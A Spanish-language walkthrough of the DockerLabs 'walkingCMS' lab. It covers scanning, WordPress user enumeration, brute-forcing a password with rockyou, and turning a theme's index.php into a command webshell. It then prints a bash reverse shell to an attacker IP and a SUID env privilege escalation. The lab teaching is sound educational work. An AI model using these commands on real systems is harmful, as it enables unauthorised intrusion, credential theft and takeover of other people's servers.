# walkingCMS

Pequeño Lab en modo **easy** de dockerlabs.

#### Enlaces:

---

## 🔎 Reconocimiento

Se asume que la máquina objetivo se encuentra correctamente desplegada dentro de nuestra red de laboratorio (en este caso, utilizando Docker).
Dado que la dirección IP del objetivo es proporcionada o fácilmente identificable dentro del entorno controlado, esta fase puede clasificarse como **reconocimiento pasivo**.

En un escenario real, el reconocimiento pasivo se orienta a recopilar información sin interactuar directamente con el sistema objetivo (por ejemplo, utilizando fuentes OSINT, registros públicos o información de infraestructura).
En este caso particular, al tratarse de un laboratorio aislado, la obtención de la IP se considera suficiente para dar inicio a la fase de enumeración activa.

![enter image description here](https://i.imgur.com/3XmtBs3.png)

---

## 📡 Escaneo

Como primer paso, se realizó un escaneo general de puertos y servicios con la herramienta **Nmap**, con el objetivo de identificar qué servicios se encuentran expuestos en el sistema objetivo (target) y obtener un panorama inicial de la superficie de ataque.

El comando ejecutado fue el siguiente:

    nmap -p- --open -sC -sC -sV --min-rate 5000 -n -Pn 172.17.0.2

- **-p-** → Escanea todos los puertos TCP (1 al 65535).

- **--open** → Muestra únicamente los puertos abiertos.

- **-sC** → Ejecuta los scripts por defecto de Nmap (NSE) para detección básica de vulnerabilidades y configuraciones inseguras.

- **-sV** → Intenta identificar la versión de los servicios en ejecución.

- **--min-rate** 5000 → Acelera el escaneo estableciendo un mínimo de 5000 paquetes por segundo.

- **-n** → Evita la resolución DNS para mayor rapidez.

- **-Pn** → Omite la fase de descubrimiento de host (se asume que el host está activo).

- **172.17.0.2** → Dirección IP asignada a la máquina víctima dentro del entorno Docker.

![enter image description here](https://i.imgur.com/1WvtOWR.png)

### Resultados del escaneo

El escaneo realizado con Nmap reveló que el puerto **80/tcp** se encuentra abierto y asociado al servicio HTTP. Esto indica la presencia de un servidor web en ejecución dentro del objetivo.

Con esta información inicial, se procedió a validar el hallazgo accediendo mediante un navegador a la dirección: `http://172.17.0.2` De esta manera, se confirma la existencia de un servicio web activo en el sistema. A partir de este punto, se iniciará la fase de enumeración web, con el fin de identificar posibles directorios ocultos, archivos sensibles o vulnerabilidades presentes en la aplicación expuesta. que hay un servicio web en efecto.

![enter image description here](https://i.imgur.com/RAoQPtY.png)

---

### 📂 Enumeración

El objetivo de esta fase es detectar posibles rutas ocultas o sensibles que puedan ser utilizadas para obtener información adicional del sistema o ser explotadas como vectores de ataque.

Para esta tarea se empleó la herramienta **Gobuster**, la cual permite realizar un ataque de fuerza bruta sobre el árbol de directorios utilizando listas de palabras previamente definidas.

    gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 20 -x php,txt,html,php.bak

**Nota**: Podríamos tener en cuenta las siguientes consideraciones antes de usar el gobuster:

- **seclists** → Es un directorio genérico de diccionarios que se pueden instalar en parrot y kali utilizando `sudo apt install seclists`
- **-x** → Es para definir las extensiones que queremos encontrar al escanear la web.

![enter image description here](https://i.imgur.com/Acs91Dy.png)

Tras la ejecución de Gobuster, se identificaron varios directorios accesibles dentro del servidor web. Entre ellos, uno de especial interés corresponde a `http://172.17.0.2/wordpress` por lo que si nos dirigimos al enlace visualizaremos una página de inicio.

![enter image description here](https://i.imgur.com/qAyX6Nu.png)

Una vez identificado el directorio `/wordpress`, se determinó que el servicio corresponde a un CMS WordPress.
Dado que este tipo de plataformas son propensas a vulnerabilidades relacionadas con su versión, plugins y temas instalados, se decidió realizar un análisis de seguridad empleando la herramienta **WPScan**.

    wpscan --url "http://172.17.0.2/wordpress" --enumerate u, vp

![enter image description here](https://i.imgur.com/inH5Nxo.png)
![enter image description here](https://i.imgur.com/tSSdBwY.png)

Utilizar algun script con payloads personalizados o desde metasploit también sería una buena opción, para aprovechar el **xmlrpc** ya que practicamente es un fósil que presenta riesgos de seguridad.
Se identificó también que hay un tema activo y es el **twenty twentytwo**, algo que podría ser utilizado para explotar o algún plugin que tenga sus fallas o malas configuraciones a simple vista. En este caso el theme parece ser accessible desde una ruta en el navegador.
Por otro lado, hay un usuario llamado "mario" que podría resultar útil en un ataque de fuerza bruta, es por esto que se decide escanear nuevamente con el **wpscan** y añadirle nuevos parámetros como un diccionario de combinaciones de passwords como lo es rockyou y un usuario.

    wpscan --url "http://172.17.0.2/wordpress" --enumerate u, vp --passwords /home/criollo/rockyou.txt --usernames mario --random-user-agent

![enter image description here](https://i.imgur.com/CQAVinl.png)

Con un ataque automático de brute force realizado por el wpscan y utilizando nuestro diccionario de combinaciones obtenemos la contraseña.
Si analizamos nuevamente con el gobuster pero utilizando el directorio de wordpress, encontraríamos otros resultados que nos ayudarían a conseguir la forma de loguear o utilizar las credenciales que obtuvimos.

![enter image description here](https://i.imgur.com/MfPg9z8.png)

---

## 💥 Explotación

A continuación, podremos notar que:

    http://172.17.0.2/wordpress/wp-login.php

Es una ruta que parece llevarnos al inicio de sesión de nuestro Wordpress, si intentamos con las credenciales y obtenemos acceso a la dashboard de la plataforma.
![enter image description here](https://i.imgur.com/Tcr1UUP.png)

Directamente se tuvo muy encuenta la revelación del wpscan con respecto al tema twenty twenty por lo que al saber que se puede acceder desde `http://172.17.0.2/wordpress/themes/twentytwentytwo/index.php`
Podriamos usarlo para realizar una reverse shell editando el index.php, para eso dentro de la dashboard se posiciona en `Apariencia>Theme Code Editor`, luego se ubica el index.php y se editar, reemplazando el código original por un código php básico donde se reciba el query param **cmd**, una vez lo modifiquemos, le damos a **Update File** y ya podríamos acceder a la ruta del tema utilizando parámetros que en esta ocasión sería cmd=COMANDO.
![enter image description here](https://i.imgur.com/diWBn6X.png)

Un claro ejemplo de esto sería ejecutar un comando a nivel de terminal en linux (esta máquina es debian) como es el `ls` y obtener algo como:

![enter image description here](https://i.imgur.com/XZDGpMy.png)

### Reverse shell

Debido a que funciona, se puede utilizar un código en bash para ejecutar una reverse shell que nos permita establecer conexión desde shell. En este caso podríamos usar la de bash encontrada en [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), donde la IP será de nuetra máquina atacante al igual que el puerto de escucha.

Ejemplo:

    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

Aplicado sería:

    http://172.17.0.2/wordpress/themes/twentytwentytwo/index.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.0.0.1/443 0>%261"

**Notas**:

- Con el código de `%26`reemplazamos a la **&** y mejoramos la inyección de comando evitando errores.
- Se utilizó el puerto 443 en lugar del 8080
- Antes de ejecutar el webshell se utilizó netcat para ponerse a la escucha con el puerto designado `sudo nc -lvnp 443`

Luego de ejecutar el comando en la Web shell, conseguimos establecer conexión con nuestra máquina.
![enter image description here](https://i.imgur.com/dpYnHCI.png)

### 🔝 Escalar privilegios

Moviéndose al `/home`se pueden buscar archivos en la raíz que permitan ser explotados o ejecutados para conseguir el `root`de la máquina.

    find / -perm -4000 2>/dev/null

![enter image description here](https://i.imgur.com/3lkIOGD.png)

Buscando en [GTFObins](https://gtfobins.github.io/gtfobins/env/) , `env` podría ser explotado de la siguiente manera con SUID obteniendo escalada de privilegios:

```
sudo install -m =xs $(which env) .

./env /bin/sh -p
```

Por lo que si lo aplicamos a nuestra máquina...
![enter image description here](https://i.imgur.com/HAivnyT.png)

Logramos comprometerla y obtener el usuario root.
